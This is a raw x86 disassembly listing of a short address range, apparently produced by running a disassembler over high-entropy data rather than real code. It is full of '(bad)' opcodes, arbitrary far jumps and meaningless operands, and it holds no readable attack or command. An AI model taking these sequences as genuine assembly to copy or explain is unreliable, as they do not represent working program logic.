  40b7ad:	ror    DWORD PTR [edi],1
  40b7af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7b0:	sub    BYTE PTR [ebp-0x591b07d1],0xdf
  40b7b7:	jae    0x40b748
  40b7b9:	(bad)  
  40b7ba:	jae    0x40b75d
  40b7bc:	push   0x0
  40b7be:	lahf   
  40b7bf:	add    eax,DWORD PTR [esi]
  40b7c1:	jno    0x40b789
  40b7c3:	mov    eax,ds:0xff4dcfcb
  40b7c8:	sbb    dl,BYTE PTR [eax]
  40b7ca:	adc    eax,0x50a425a7
  40b7cf:	sbb    esp,ebp
  40b7d1:	jp     0x40b7ab
  40b7d3:	nop
  40b7d4:	cdq    
  40b7d5:	pop    ds
  40b7d6:	inc    ebp
  40b7d7:	push   eax
  40b7d8:	cs dec esp
  40b7da:	mov    ebx,0x89e4d26b
  40b7df:	test   cl,dh
  40b7e1:	add    DWORD PTR [ecx-0x12],esp
  40b7e4:	enter  0x3e8b,0x63
  40b7e8:	jbe    0x40b807
  40b7ea:	mov    dh,0x7
  40b7ec:	push   esp
  40b7ed:	xor    ebp,ecx
  40b7ef:	sub    ecx,eax
  40b7f1:	ret    0x78dd
  40b7f4:	sbb    BYTE PTR [eax],ch
  40b7f6:	les    edi,FWORD PTR [ebp+0x2fe6728]
  40b7fc:	mov    edi,0x9d307e40
  40b801:	add    DWORD PTR [ecx-0x39],0xa41f62f7
  40b808:	pop    esi
  40b809:	pusha  
  40b80a:	mov    ah,0x33
  40b80c:	jo     0x40b844
  40b80e:	push   0xffffffb4
  40b810:	popf   
  40b811:	jge    0x40b839
  40b813:	sbb    BYTE PTR [edx+0x61],ah
  40b816:	inc    esp
  40b817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b818:	lea    edi,[eax-0x3d]
  40b81b:	int    0x9c
  40b81d:	mov    eax,DWORD PTR [edi]
  40b81f:	bound  ebp,QWORD PTR [ebx+0x56c1860e]
  40b825:	xor    al,0x71
  40b827:	jmp    0x53a2e0eb
  40b82c:	xchg   BYTE PTR [ecx-0x180ac31a],bl
  40b832:	jae    0x40b7f7
  40b834:	enter  0xf45b,0x81
  40b838:	mov    ah,ch
  40b83a:	add    al,0xb1
  40b83c:	(bad)  
  40b83d:	bnd jno 0x40b82f
  40b840:	sub    eax,0xb8c0c23e
  40b845:	xchg   edx,eax
  40b846:	lea    ebx,[esi]
  40b848:	add    DWORD PTR [ebp+ebx*1-0x2f],ecx
  40b84c:	xchg   ebx,eax
  40b84d:	jecxz  0x40b8ad
  40b84f:	mov    cl,0x59
  40b851:	xchg   ecx,eax
  40b852:	cli    
  40b853:	es cs cdq 
  40b856:	mov    WORD PTR [ebp+0x6646ac2b],?
  40b85c:	ret    
  40b85d:	add    bh,BYTE PTR [ebx+0x16c5d377]
  40b863:	or     DWORD PTR [esi-0x5eb2152b],0xffffffbd
  40b86a:	(bad)  
  40b86b:	sahf   
  40b86c:	add    BYTE PTR [esp+esi*1],0x66
  40b870:	loopne 0x40b813
  40b872:	jge    0x40b83e
  40b874:	pop    ebx
  40b875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b876:	pop    edx
  40b877:	rcr    DWORD PTR [ebx],0xbb
  40b87a:	sub    al,0xcb
  40b87c:	add    ah,ah
  40b87e:	xor    bh,BYTE PTR [ebp+0x4d6694c4]
  40b884:	sbb    BYTE PTR [eax-0x3344e704],ah
  40b88a:	pop    ecx
  40b88b:	inc    edx
  40b88c:	mov    DWORD PTR [esi-0x798df746],edi
  40b892:	nop
  40b893:	fcomp  QWORD PTR ds:0xe83f728a
  40b899:	mov    dl,0xe
  40b89b:	inc    esp
  40b89c:	xor    DWORD PTR [esi-0x2],edx
  40b89f:	(bad)  
  40b8a0:	stos   DWORD PTR es:[edi],eax
  40b8a1:	xchg   ecx,eax
  40b8a2:	push   ss
  40b8a3:	add    esp,DWORD PTR [ebx-0x4c]
  40b8a6:	pop    ebp
  40b8a7:	cmp    eax,0x1ce7b35e
  40b8ac:	mov    dh,0xa8
  40b8ae:	inc    edx
  40b8af:	imul   ecx,DWORD PTR [ebx+0x2b],0xfffffffa
  40b8b3:	lds    ebp,FWORD PTR [edx+0x42]
  40b8b6:	dec    eax
  40b8b7:	jp     0x40b87b
  40b8b9:	int    0xd2
  40b8bb:	rcl    al,1
  40b8bd:	hlt    
  40b8be:	add    eax,0x563e6f5e
  40b8c3:	push   eax
  40b8c4:	and    al,0x6e
  40b8c6:	repnz es (bad) 
  40b8c9:	fcmovu st,st(5)
  40b8cb:	pop    es
  40b8cc:	(bad)  
  40b8ce:	cwde   
  40b8cf:	jle    0x40b917
  40b8d1:	pusha  
  40b8d2:	fild   WORD PTR [ebp-0x58342f57]
  40b8d8:	cmp    BYTE PTR [eax+0x2f],cl
  40b8db:	lds    edi,FWORD PTR [eax-0x15]
  40b8de:	arpl   ax,si
  40b8e0:	jmp    0x9a4f:0x694b98ea
  40b8e7:	adc    BYTE PTR ds:0x49a7b000,dl
  40b8ed:	sbb    BYTE PTR [esi+0x63],0xd5
  40b8f1:	nop
  40b8f2:	xor    DWORD PTR [eax+0x59],esp
  40b8f5:	aaa    
  40b8f6:	lock mov dh,0x24
  40b8f9:	and    DWORD PTR [ecx],esi
  40b8fb:	rcr    BYTE PTR [ebx],0x4c
  40b8fe:	jo     0x40b917
  40b900:	dec    ecx
  40b901:	lods   eax,DWORD PTR ds:[esi]
  40b902:	xor    BYTE PTR [ebx],al
  40b904:	lea    eax,[eax+0x54]
  40b907:	dec    ecx
  40b908:	mov    al,0x25
  40b90a:	inc    esi
  40b90b:	pop    ebp
  40b90c:	outs   dx,BYTE PTR ds:[esi]
  40b90d:	pushf  
  40b90e:	cmp    eax,0xe57ba24
  40b913:	mov    dh,0xad
  40b915:	fisub  DWORD PTR ds:0x1d90756a
  40b91b:	bound  ebx,QWORD PTR ds:[edi-0x41]
  40b91f:	push   0x53e99581
  40b924:	fdivr  QWORD PTR [esi]
  40b926:	mov    al,0x18
  40b928:	mov    dl,BYTE PTR [ecx+0x4b4ec476]
  40b92e:	xchg   esi,eax
  40b92f:	mov    WORD PTR [esi+0x5207def3],cs
  40b935:	add    bh,ch
  40b937:	sbb    ecx,ebx
  40b939:	loop   0x40b8fb
  40b93b:	add    BYTE PTR [ebx],bl
  40b93d:	xor    al,BYTE PTR [edx]
  40b93f:	ins    DWORD PTR es:[edi],dx
  40b940:	(bad)  
  40b941:	sub    BYTE PTR [edx],cl
  40b943:	adc    eax,0x5a051537
  40b948:	cmp    BYTE PTR [eax+0x65],0x2c
  40b94c:	cs fwait
  40b94e:	dec    eax
  40b94f:	retf   0xd7f
  40b952:	aas    
  40b953:	stc    
  40b954:	arpl   WORD PTR [eax+edx*8+0x7b],si
  40b958:	pop    es
  40b959:	jmp    0x99c:0x30d8585b
  40b960:	jb     0x40b996
  40b962:	push   ss
  40b963:	pop    ebx
  40b964:	lods   eax,DWORD PTR ds:[esi]
  40b965:	aas    
  40b966:	test   BYTE PTR [edx-0x57],dl
  40b969:	inc    edi
  40b96a:	inc    ecx
  40b96b:	rcl    WORD PTR [eax+ecx*4],1
  40b96f:	jbe    0x40b9eb
  40b971:	mov    edi,0x6cbf13e0
  40b976:	test   BYTE PTR [edi],bh
  40b978:	xchg   esp,eax
  40b979:	in     eax,dx
  40b97a:	shl    DWORD PTR [edi+eiz*2+0x70eda76e],cl
  40b981:	jecxz  0x40b959
  40b983:	mul    ecx
  40b985:	int    0x75
  40b987:	push   ebx
  40b988:	fs cmp bh,bl
  40b98b:	and    DWORD PTR [edx-0x31],edi
  40b98e:	mov    bh,0xa
  40b990:	mov    DWORD PTR [edx+0x51d44e1d],eax
  40b996:	stc    
  40b997:	mov    ds:0x8168e4d1,eax
  40b99c:	in     al,0xb8
  40b99e:	jge    0x40b9b6
  40b9a0:	cli    
  40b9a1:	sbb    BYTE PTR [edx],bl
  40b9a3:	mov    BYTE PTR [ecx+0x2cbaec31],dh
  40b9a9:	push   ds
  40b9aa:	out    0xae,al
  40b9ac:	(bad)  [edx*1-0x5e5e4ee6]
  40b9b3:	data16 addr16 (bad) 
  40b9b6:	jne    0x40b944
  40b9b8:	cmp    eax,0x578243b4
  40b9bd:	mov    bh,0xc5
  40b9bf:	cld    
  40b9c0:	jnp    0x40b9f1
  40b9c2:	mov    dh,0xd4
  40b9c4:	push   edx
  40b9c5:	push   esp
  40b9c6:	adc    al,0xe4
  40b9c8:	adc    BYTE PTR [ecx],cl
  40b9ca:	and    DWORD PTR [ebx],esp
  40b9cc:	jecxz  0x40b991
  40b9ce:	mov    bh,0x7f
  40b9d0:	cs mov ah,0xc9
  40b9d3:	or     al,0x81
  40b9d5:	push   esi
  40b9d6:	mov    ebp,DWORD PTR [ebx+0x13]
  40b9d9:	js     0x40ba13
  40b9db:	test   eax,0x537b9043
  40b9e0:	inc    esi
  40b9e1:	div    DWORD PTR [esi-0x27]
  40b9e4:	push   DWORD PTR [edx]
  40b9e6:	aaa    
  40b9e7:	mov    edx,0xfcb33513
  40b9ec:	adc    eax,0x1eaaa31c
  40b9f1:	jmp    0x40ba07
  40b9f3:	or     al,0x6d
  40b9f5:	rol    bh,cl
  40b9f7:	cdq    
  40b9f8:	or     eax,0x875147a7
  40b9fd:	and    BYTE PTR [ebx-0x603c83dd],ah
  40ba03:	js     0x40ba6c
  40ba05:	sub    eax,0xbf76659
  40ba0a:	dec    ecx
  40ba0b:	add    ebx,DWORD PTR [edx]
  40ba0d:	inc    ebp
  40ba0e:	push   ecx
  40ba0f:	stos   BYTE PTR es:[edi],al
  40ba10:	(bad)  
  40ba11:	xor    eax,0xf4c2f2fa
  40ba16:	mov    edx,0x5cbaed80
  40ba1b:	xchg   esi,eax
  40ba1c:	jns    0x40b9e7
  40ba1e:	cmp    al,0x63
  40ba20:	inc    ebx
  40ba21:	(bad)  
  40ba22:	jl     0x40ba86
  40ba24:	mov    ebp,0x175133d4
  40ba29:	test   ecx,esi
  40ba2b:	sti    
  40ba2c:	mov    bh,0x9b
  40ba2e:	xor    BYTE PTR [ebp-0x71],ah
  40ba31:	push   ebp
  40ba32:	sbb    ecx,DWORD PTR ss:[ebx-0x41]
  40ba36:	or     ch,BYTE PTR [ebp-0x484f6294]
  40ba3c:	jecxz  0x40ba5b
  40ba3e:	addr16 test eax,0x62b49491
  40ba44:	jae    0x40b9f7
  40ba46:	jbe    0x40ba1c
  40ba48:	and    eax,0x751e048c
  40ba4d:	push   ss
  40ba4e:	push   ds
  40ba4f:	cmp    esi,edx
  40ba51:	ud1    ebx,edi
  40ba54:	xchg   DWORD PTR [ebp-0x4934f32],esp
  40ba5a:	sbb    BYTE PTR [eax-0x36],0xf1
  40ba5e:	xchg   edx,eax
  40ba5f:	call   0x3ecb:0xb326ad58
  40ba66:	xchg   ebx,eax
  40ba67:	xor    BYTE PTR [edx+0x1c8b38f7],ah
  40ba6d:	dec    esi
  40ba6e:	cmp    DWORD PTR [edx-0x3f],0x52
  40ba72:	push   cs
  40ba73:	sub    DWORD PTR [ecx+0x5f719cea],0x5ce76459
  40ba7d:	ins    DWORD PTR es:[edi],dx
  40ba7e:	jmp    0x1f54623a
  40ba83:	daa    
  40ba84:	sub    eax,0xe78f3883
  40ba89:	imul   ah
  40ba8b:	icebp  
  40ba8c:	xor    BYTE PTR [ebx-0x22],al
  40ba8f:	push   eax
  40ba91:	mov    eax,0x4ce96a2
  40ba96:	js     0x40baaa
  40ba98:	mov    ebx,DWORD PTR [ebp+0x32]
  40ba9b:	push   0xffffffec
  40ba9d:	lea    esp,[ebp-0x69]
  40baa0:	add    BYTE PTR [eiz*1+0x695c539a],dl
  40baa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baa8:	sbb    BYTE PTR [edx+edx*1+0x7e],dh
  40baac:	fisttp WORD PTR [edi-0x79]
  40baaf:	mov    ebp,0xa232fc6
  40bab4:	(bad)  
  40bab5:	push   edi
  40bab6:	and    ebp,DWORD PTR [esi+0x33]
  40bab9:	jg     0x40bad5
  40babb:	dec    ebx
  40babc:	mov    dl,al
  40babe:	sahf   
  40babf:	(bad)  
  40bac0:	pop    esi
  40bac1:	inc    ebx
  40bac2:	cmp    DWORD PTR [edi+ecx*4],ecx
  40bac5:	push   ebx
  40bac6:	shl    ebp,1
  40bac8:	stos   DWORD PTR es:[edi],eax
  40bac9:	and    edx,DWORD PTR [eax-0x6b]
  40bacc:	jmp    0xfca2:0x92eac5c8
  40bad3:	push   ecx
  40bad4:	ss pusha 
  40bad6:	je     0x40bb4c
  40bad8:	fnsave [ebp+0x16d56278]
  40bade:	cwde   
  40badf:	sub    ecx,ebp
  40bae1:	test   al,0x5f
  40bae3:	mov    ebp,0xbd17c6f7
  40bae8:	mov    ds:0xc67c9c55,eax
  40baed:	cmp    ebx,DWORD PTR [ebx]
  40baef:	and    BYTE PTR [eax],al
  40baf1:	or     cl,BYTE PTR [edi+0x35906712]
  40baf7:	repz cmp dh,BYTE PTR cs:[esi+0x25]
  40bafc:	xlat   BYTE PTR ds:[ebx]
  40bafd:	inc    edi
  40bafe:	(bad)  
  40bb00:	mov    eax,ds:0x16c72a4e
  40bb05:	adc    DWORD PTR [ebx-0x3f7af831],edx
  40bb0b:	pop    edx
  40bb0c:	mov    eax,0x8ad0779f
  40bb11:	popa   
  40bb12:	aaa    
  40bb13:	mov    edi,0xf03773a0
  40bb18:	dec    ebx
  40bb19:	test   al,0x60
  40bb1b:	add    BYTE PTR [edi],0xc7
  40bb1e:	push   esp
  40bb1f:	mov    al,0x81
  40bb21:	lahf   
  40bb22:	xor    ebx,DWORD PTR [ebx-0x71]
  40bb25:	dec    edx
  40bb26:	(bad)  
  40bb27:	ror    DWORD PTR [ebx-0x59077599],1
  40bb2d:	outs   dx,BYTE PTR ds:[esi]
  40bb2f:	sub    DWORD PTR [edx-0x640dfea6],esp
  40bb35:	fdivr  st,st(5)
  40bb37:	inc    esp
  40bb38:	outs   dx,BYTE PTR ds:[esi]
  40bb39:	xor    ch,dl
  40bb3b:	sub    eax,0x28eddd13
  40bb40:	xor    eax,0x29688583
  40bb45:	xchg   esi,eax
  40bb46:	push   ebx
  40bb47:	inc    ecx
  40bb48:	mov    ebp,edx
  40bb4a:	int3   
  40bb4b:	xor    al,0x78
  40bb4d:	jnp    0x40bbb6
  40bb4f:	jmp    0xc27e:0xb9948199
  40bb56:	ins    BYTE PTR es:[edi],dx
  40bb57:	push   ecx
  40bb58:	pop    eax
  40bb59:	fs int 0xa5
  40bb5c:	rol    BYTE PTR [eiz*4-0x133e5cd2],1
  40bb63:	pushf  
  40bb64:	inc    ebp
  40bb65:	in     eax,0x22
  40bb67:	out    0xdf,al
  40bb69:	cmp    eax,0x521b2f6e
  40bb6e:	sub    DWORD PTR [edx-0xf],ebp
  40bb71:	cmp    al,0xbc
  40bb73:	rcl    DWORD PTR [eax+edi*2],1
  40bb76:	xchg   BYTE PTR [esi-0xa],al
  40bb79:	inc    edx
  40bb7a:	popf   
  40bb7b:	call   0x3ba4:0x11909945
  40bb82:	adc    DWORD PTR [edi],0x71a0c168
  40bb88:	mov    edi,0x5453ba55
  40bb8d:	push   edx
  40bb8e:	fcom   QWORD PTR [eax]
  40bb90:	push   edi
  40bb91:	fiadd  WORD PTR [ebx+0x53d9b980]
  40bb97:	stos   DWORD PTR es:[edi],eax
  40bb98:	sub    dl,BYTE PTR [ecx+0x67859b70]
  40bb9e:	sub    ebp,edx
  40bba0:	test   BYTE PTR [edx],0x0
  40bba3:	ret    0xcddc
  40bba6:	mov    eax,0xcb1c9a48
  40bbab:	in     al,0x5e
  40bbad:	mov    ch,0xc3
  40bbaf:	imul   esi,DWORD PTR [edx+0x737d260],0x14720862
  40bbb9:	push   ecx
  40bbba:	inc    esp
  40bbbb:	sub    ebp,DWORD PTR [ebx]
  40bbbd:	xchg   ebp,eax
  40bbbe:	xor    eax,0x97fd21c4
  40bbc3:	loop   0x40bb58
  40bbc5:	(bad)  
  40bbc6:	mov    dh,0xf3
  40bbc8:	mov    bh,0xdc
  40bbca:	jo     0x40bbdd
  40bbcc:	or     al,0xdb
  40bbce:	sub    BYTE PTR [edi-0x2f],dl
  40bbd1:	inc    edi
  40bbd2:	call   0x8a96f95a
  40bbd7:	imul   esp,DWORD PTR [esi+ebx*2+0x55],0x50
  40bbdc:	inc    edi
  40bbdd:	repz arpl WORD PTR [ecx+0x41],si
  40bbe1:	pop    es
  40bbe2:	push   esi
  40bbe4:	imul   esi,DWORD PTR [edi+0x37],0xffffff92
  40bbe8:	into   
  40bbe9:	xchg   esp,eax
  40bbea:	in     al,0x49
  40bbec:	adc    DWORD PTR [esi],ebx
  40bbee:	sub    esi,edi
  40bbf0:	je     0x40bc49
  40bbf2:	and    dh,al
  40bbf4:	jbe    0x40bbe2
  40bbf6:	xor    BYTE PTR [ebx],dh
  40bbf8:	sub    cl,BYTE PTR ds:0x25da98af
  40bbfe:	mov    dh,0x47
  40bc00:	retf   0x48fc
  40bc03:	or     esp,ecx
  40bc05:	adc    DWORD PTR [esp+ebp*8+0x7a],ecx
  40bc09:	or     BYTE PTR [ebx],cl
  40bc0b:	(bad)  
  40bc0c:	(bad)  
  40bc0d:	mov    ?,WORD PTR [eax-0x5f15bb47]
  40bc13:	mov    bh,0x46
  40bc15:	(bad)  
  40bc17:	loope  0x40bc72
  40bc19:	ins    BYTE PTR es:[edi],dx
  40bc1a:	into   
  40bc1b:	std    
  40bc1c:	mov    ebx,esp
  40bc1e:	sub    BYTE PTR [eax],ch
  40bc20:	fldcw  WORD PTR [ebx]
  40bc22:	xor    dl,dh
  40bc24:	cli    
  40bc25:	fcmovnu st,st(4)
  40bc27:	ja     0x40bc1c
  40bc29:	and    eax,0x87130866
  40bc2e:	int3   
  40bc2f:	adc    BYTE PTR [ebx+0x66de08c6],ah
  40bc35:	adc    al,0x29
  40bc37:	push   0x7e2b029e
  40bc3c:	nop
  40bc3d:	test   eax,0x22712391
  40bc42:	sub    al,0x90
  40bc44:	cmp    DWORD PTR [ecx],edi
  40bc46:	push   esi
  40bc47:	inc    esi
  40bc48:	sub    BYTE PTR [edi-0x34cc96e2],bh
  40bc4e:	pop    edi
  40bc4f:	ins    BYTE PTR es:[edi],dx
  40bc50:	inc    ebx
  40bc51:	cld    
  40bc52:	int    0x30
  40bc54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc55:	sbb    al,BYTE PTR [ebx+0x4f]
  40bc58:	cmp    DWORD PTR ds:0x9c517db8,0xbc21606f
  40bc62:	(bad)  
  40bc63:	cmp    BYTE PTR [edx-0x33],bl
  40bc66:	xchg   BYTE PTR [edx+0x1c],ch
  40bc69:	cmovo  ebp,DWORD PTR [esi-0x22]
  40bc6d:	dec    edi
  40bc6e:	mov    al,ds:0x390e20db
  40bc73:	inc    edx
  40bc74:	jmp    0xb70f8a70
  40bc79:	xchg   ebp,eax
  40bc7a:	mov    WORD PTR [esi-0x1c],fs
  40bc7d:	mov    WORD PTR [ecx+0x73bd122c],gs
  40bc83:	js     0x40bc59
  40bc85:	mov    edi,0x4a47a6b1
  40bc8a:	xchg   ecx,eax
  40bc8b:	xor    eax,0x7739bd7b
  40bc90:	jb     0x40bc90
  40bc92:	inc    ebx
  40bc93:	pop    ss
  40bc94:	xlat   BYTE PTR ds:[ebx]
  40bc95:	sahf   
  40bc96:	mov    dh,0x0
	...
  40bd14:	pop    edx
  40bd15:	in     al,0xf9
  40bd17:	(bad)  
  40bd18:	(bad)  
  40bd19:	fnstsw WORD PTR [edi-0x2]
  40bd1c:	or     eax,0x724271cc
  40bd21:	push   esi
  40bd22:	inc    ecx
  40bd23:	or     edx,DWORD PTR [ebp+ebp*2+0x76b0000]
  40bd2a:	add    BYTE PTR [eax],al
  40bd2c:	enter  0x2fe4,0x0
  40bd30:	mov    ebp,0x4f80283e
  40bd35:	ins    BYTE PTR es:[edi],dx
  40bd36:	in     eax,dx
  40bd37:	lock ret 0x9fef
  40bd3b:	cmp    edx,ebx
  40bd3d:	cwde   
  40bd3e:	sub    al,0x32
  40bd40:	xor    esi,esp
  40bd42:	xor    edi,eax
  40bd44:	mov    al,ds:0xb9a483ec
  40bd49:	cmp    edi,DWORD PTR [eax+eiz*8+0x3b]
  40bd4d:	ja     0x40bd29
  40bd4f:	cmc    
  40bd50:	xchg   edi,eax
  40bd51:	and    eax,0xbea6cf5
  40bd56:	cwde   
  40bd57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd58:	mov    eax,0xc31f9ede
  40bd5d:	aam    0xaf
  40bd5f:	mov    bh,0x62
  40bd61:	xor    eax,0xa7144a35
  40bd66:	mov    ebx,0xb9d38338
  40bd6b:	sub    al,0xf0
  40bd6d:	push   ebx
  40bd6e:	iret   
  40bd6f:	jo     0x40bcf2
  40bd71:	mov    DWORD PTR [ebp-0x6d],edi
  40bd74:	and    al,0xa0
  40bd76:	mov    DWORD PTR ds:[edi+0x1b],eax
  40bd7a:	push   ds
  40bd7b:	sub    al,0x4b
  40bd7d:	and    esp,0x1bf8b866
  40bd83:	and    esp,edx
  40bd85:	mov    al,ds:0xb08c5aa1
  40bd8a:	in     eax,0x79
  40bd8c:	push   ss
  40bd8d:	fistp  QWORD PTR [eax-0x52]
  40bd90:	mov    esp,0x680bd4fd
  40bd95:	inc    edi
  40bd96:	or     DWORD PTR [edi],eax
  40bd98:	lahf   
  40bd99:	test   DWORD PTR [bx+di],0xc9b54a2e
  40bda0:	lahf   
  40bda1:	call   0xa16db08b
  40bda6:	cmc    
  40bda7:	lock mov dl,BYTE PTR [esi+0x6c]
  40bdab:	pop    es
  40bdac:	mov    BYTE PTR [eax+0x79aecbbf],bl
  40bdb2:	push   cs
  40bdb3:	fdivp  st(1),st
  40bdb5:	sub    DWORD PTR [edx+0x41],eax
  40bdb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdb9:	and    al,dl
  40bdbb:	ins    BYTE PTR es:[edi],dx
  40bdbc:	imul   ebp,DWORD PTR ds:0x8d5c75ae,0xcb4248ef
  40bdc6:	int3   
  40bdc7:	sub    DWORD PTR [esi+0xf4dfe02],0x75869518
  40bdd1:	pushf  
  40bdd2:	loop   0x40bd79
  40bdd4:	inc    ecx
  40bdd5:	mov    ecx,0x37e07cd9
  40bdda:	mov    al,0x8
  40bddc:	push   0xffffffbd
  40bdde:	jb     0x40bd72
  40bde0:	rcr    BYTE PTR [esi],0xdb
  40bde3:	xor    bh,bl
  40bde5:	pop    ds
  40bde6:	sbb    BYTE PTR [ecx+0x33c7650c],ch
  40bdec:	push   es
  40bded:	sbb    BYTE PTR [esi+0x7629d14e],dl
  40bdf3:	loop   0x40be70
  40bdf5:	rcl    DWORD PTR [ebx+0x5e],1
  40bdf8:	int3   
  40bdf9:	push   0xffffff90
  40bdfb:	loop   0x40bda8
  40bdfd:	fstp   QWORD PTR [ecx-0x23]
  40be00:	push   ebp
  40be01:	jg     0x40be12
  40be03:	ds pop edx
  40be05:	or     BYTE PTR [ebx-0x3da21bf],bl
  40be0b:	adc    DWORD PTR [edx],esp
  40be0d:	dec    ebx
  40be0e:	in     eax,0xb5
  40be10:	xchg   esi,eax
  40be11:	out    0x6,eax
  40be13:	outs   dx,BYTE PTR ds:[esi]
  40be14:	lods   eax,DWORD PTR ds:[esi]
  40be15:	xor    ebx,DWORD PTR [edi]
  40be17:	fxch   st(6)
  40be19:	xor    eax,0xacadc322
  40be1e:	call   0x279a28d
  40be23:	ret    
  40be24:	(bad)  
  40be25:	mov    bh,0x6d
  40be27:	ins    DWORD PTR es:[edi],dx
  40be28:	pop    ds
  40be29:	aas    
  40be2a:	aaa    
  40be2b:	ror    BYTE PTR [edi-0x12df978b],0x68
  40be32:	mov    edx,0x51dfc060
  40be37:	xlat   BYTE PTR ds:[ebx]
  40be38:	push   0x6b
  40be3a:	mov    cl,0xa0
  40be3c:	sar    DWORD PTR [ecx+ecx*1-0x27e7e928],0x9
  40be44:	lods   eax,DWORD PTR ds:[esi]
  40be45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be46:	add    BYTE PTR [edi],bl
  40be48:	std    
  40be49:	mov    dh,0x25
  40be4b:	cmp    DWORD PTR [edx-0x56],eax
  40be4e:	pop    ss
  40be4f:	jns    0x40bece
  40be51:	lock xchg ebp,eax
  40be53:	sub    ebp,DWORD PTR [esi+0x1e]
  40be56:	pop    esi
  40be57:	pop    ss
  40be58:	imul   edx,DWORD PTR [edi],0x11
  40be5b:	int3   
  40be5c:	aad    0xda
  40be5e:	es mov esi,0xc2ce63e8
  40be64:	nop
  40be65:	xor    bl,BYTE PTR [ebp+0x70]
  40be68:	or     edx,0x55e21c68
  40be6e:	add    al,0x51
  40be70:	lds    esi,FWORD PTR [eax-0x66]
  40be73:	(bad)  
  40be74:	sbb    al,0xb5
  40be76:	out    0x43,al
  40be78:	das    
  40be79:	ja     0x40be21
  40be7b:	ins    BYTE PTR es:[edi],dx
  40be7c:	mov    bh,0x44
  40be7e:	jns    0x40be19
  40be80:	xchg   esp,eax
  40be81:	push   cs
  40be82:	loopne 0x40be4b
  40be84:	sti    
  40be85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be86:	jns    0x40be3c
  40be88:	cld    
  40be89:	scas   eax,DWORD PTR es:[edi]
  40be8a:	fisub  DWORD PTR ds:0xfb3cccd2
  40be90:	cdq    
  40be91:	mov    dh,0x86
  40be93:	pop    edx
  40be94:	sub    al,0xc3
  40be96:	xchg   esi,eax
  40be97:	clc    
  40be98:	push   es
  40be99:	in     al,dx
  40be9a:	scas   eax,DWORD PTR es:[edi]
  40be9b:	(bad)  
  40be9c:	xchg   edx,eax
  40be9d:	retf   
  40be9e:	xchg   ecx,eax
  40be9f:	out    0x34,al
  40bea1:	cvtps2pd xmm1,QWORD PTR [bx]
  40bea5:	ins    BYTE PTR es:[edi],dx
  40bea6:	pusha  
  40bea7:	xlat   BYTE PTR ds:[ebx]
  40bea8:	xchg   esp,eax
  40bea9:	repnz lods eax,DWORD PTR ds:[esi]
  40beab:	inc    ebp
  40beac:	fimul  DWORD PTR [ebp-0x2a]
  40beaf:	xchg   ecx,eax
  40beb0:	and    DWORD PTR [edx+0x65],ecx
  40beb3:	test   BYTE PTR [eax+0x4f],0x71
  40beb7:	mov    ss,esp
  40beb9:	adc    DWORD PTR [ebx+eiz*8+0x56e43852],ecx
  40bec0:	mov    DWORD PTR ss:[ecx],edx
  40bec3:	in     al,dx
  40bec4:	out    dx,eax
  40bec5:	dec    esp
  40bec6:	mov    ch,0xb4
  40bec8:	inc    ecx
  40bec9:	repz or ecx,DWORD PTR [edi]
  40becc:	cmp    eax,0x289553c
  40bed1:	push   eax
  40bed2:	xchg   ch,dh
  40bed4:	fdivrp st(2),st
  40bed6:	mov    ecx,0xbec9ef79
  40bedb:	inc    ebp
  40bedc:	sbb    al,0xc3
  40bede:	hlt    
  40bedf:	xor    BYTE PTR [ebp+0x3a],dl
  40bee2:	fst    DWORD PTR [edi+0x64f29cc5]
  40bee8:	lods   al,BYTE PTR ds:[esi]
  40bee9:	leave  
  40beea:	fmul   DWORD PTR [ebp+0x3cb65a95]
  40bef0:	mov    BYTE PTR [ecx+ebx*2],dl
  40bef3:	sub    cl,bh
  40bef5:	stos   BYTE PTR es:[edi],al
  40bef6:	shl    esi,0x90
  40bef9:	push   edx
  40befa:	out    0x3d,eax
  40befc:	or     BYTE PTR [ebx-0xd],al
  40beff:	inc    edi
  40bf00:	je     0x40bf75
  40bf02:	ja     0x40bf48
  40bf04:	mov    ah,0x8e
  40bf06:	jne    0x40bf5e
  40bf08:	push   ds
  40bf09:	aam    0x47
  40bf0b:	jae    0x40bf79
  40bf0d:	or     al,0x5
  40bf0f:	les    ebx,FWORD PTR [edx-0x17]
  40bf12:	xor    DWORD PTR [esi],ebx
  40bf14:	ins    DWORD PTR es:[edi],dx
  40bf15:	daa    
  40bf16:	fsub   QWORD PTR [esi+0x2]
  40bf19:	repz xor al,0xe8
  40bf1c:	lahf   
  40bf1d:	xor    ecx,DWORD PTR [esi+0x7cf83680]
  40bf23:	mov    al,0x70
  40bf25:	dec    ecx
  40bf26:	test   BYTE PTR [ebx],0x8f
  40bf29:	jl     0x40bfa3
  40bf2b:	les    edi,FWORD PTR [ecx+edi*8+0x29]
  40bf2f:	or     DWORD PTR [esi-0x203a2e37],ebp
  40bf35:	add    al,0xc7
  40bf37:	sbb    BYTE PTR [si-0x5b75],0x6b
  40bf3d:	sbb    eax,0xc29de21d
  40bf42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf43:	xor    eax,0xe81fc545
  40bf48:	in     al,dx
  40bf49:	add    ebp,eax
  40bf4b:	mov    eax,ss:0x39e2075a
  40bf51:	xor    DWORD PTR [edi+0x7a],ebp
  40bf54:	pop    edx
  40bf55:	(bad)  
  40bf56:	out    dx,eax
  40bf57:	ds adc eax,0x9a75e04b
  40bf5d:	int    0xcb
  40bf5f:	jl     0x40bf81
  40bf61:	adc    dl,BYTE PTR [eax-0x39]
  40bf64:	shr    BYTE PTR [ebx],1
  40bf66:	retf   
  40bf67:	(bad)  
  40bf68:	clc    
  40bf69:	lea    ecx,[ebp+0x766022cd]
  40bf6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf70:	push   edx
  40bf71:	or     ebp,DWORD PTR [edx-0x4]
  40bf74:	sub    eax,0x6f9059a8
  40bf79:	fwait
  40bf7a:	imul   edx,ebx,0xffffffdc
  40bf7d:	jmp    0xe814:0xbe1ccb5d
  40bf84:	mov    ch,0xdd
  40bf86:	mov    al,ds:0xc3f51ca1
